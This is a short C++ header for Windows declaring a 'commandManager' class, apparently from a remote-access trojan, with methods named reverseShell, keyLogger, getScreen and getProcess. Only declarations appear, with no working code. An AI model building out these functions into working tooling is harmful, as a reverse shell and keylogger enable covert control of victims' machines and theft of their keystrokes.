#pragma once
#include <string>
#include <Windows.h>

class commandManager
{
//private:
	

public:
	ULONG64 data_len = 0;
	commandManager();
	std::string reverseShell(std::string cmd);
	void getProcess();
	LPVOID getScreen();
	void keyLogger();
};

